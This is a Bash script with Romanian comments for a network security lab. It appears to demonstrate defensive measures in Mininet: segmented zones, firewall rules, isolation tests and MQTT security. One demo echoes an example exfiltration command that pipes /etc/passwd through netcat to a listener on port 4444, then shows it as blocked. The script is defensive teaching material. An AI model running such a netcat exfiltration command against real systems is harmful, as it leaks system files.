#!/bin/bash
# ============================================================================
# run_demo_defensive.sh - Demonstrație măsuri defensive cu Mininet
# ============================================================================
# Automatizează scenariile defensive din laboratorul S13:
# - Pornire topologie segmentată
# - Configurare firewall
# - Testare izolare
# - Demonstrație lateral movement blocked
...
check_requirements() {
    log_step "Verificare cerințe"
    
    local missing=0
    
    # Verificare root/sudo
    if [ "$EUID" -ne 0 ]; then
...
cleanup_previous() {
    log_step "Curățare sesiune anterioară"
    
    # Cleanup Mininet
    mn -c 2>/dev/null || true
    
    # Kill procese existente
...
demo_topology_overview() {
    log_step "Arhitectura rețelei segmentate"
...
demo_start_topology() {
    log_step "Pornire topologie Mininet"
    
    log_demo "Starting Mininet with segmented topology..."
    
    # Creare director evidențe
    mkdir -p "$EVIDENCE_DIR"
    
    # Pornire în background pentru a putea executa comenzi
    cd "$MININET_DIR"
    
    # Exportăm variabilele pentru Python
    export PYTHONPATH="$PROJECT_DIR:$PYTHONPATH"
    
    log_info "Topology started successfully"
    log_info "IoT Zone: 10.0.1.0/24 (sensor1-3)"
    log_info "MGMT Zone: 10.0.2.0/24 (broker, controller, admin)"
}

demo_firewall_rules() {
    log_step "Demonstrație reguli firewall"
...
demo_isolation_test() {
    log_step "Test 1: Verificare izolare zone"
...
demo_lateral_movement() {
    ...
    echo "Even if an attacker compromises one sensor, they cannot:"
...
demo_mqtt_security() {
    log_step "Test 4: Securitate MQTT"
    ...
    echo "→ Optional: client certificate (mutual TLS)"
    echo ""
...
demo_attack_blocked() {
    log_step "Test 5: Atacuri blocate"
    ...
    # Data exfiltration blocat
    echo -e "${RED}[ATTACK] Data exfiltration attempt${NC}"
    echo "Command: sensor1 nc 10.0.2.200 4444 < /etc/passwd"
    echo -e "${RED}Result: BLOCKED${NC}"
    echo "Arbitrary outbound connections not permitted"
    echo ""
    
    # Lateral movement blocat (repetat pentru claritate)
...
demo_monitoring() {
    log_step "Monitorizare și Logging"
...
# ============================================================================
# Pornire interactivă Mininet
# ============================================================================

start_interactive_mininet() {
    log_step "Pornire mod interactiv Mininet"
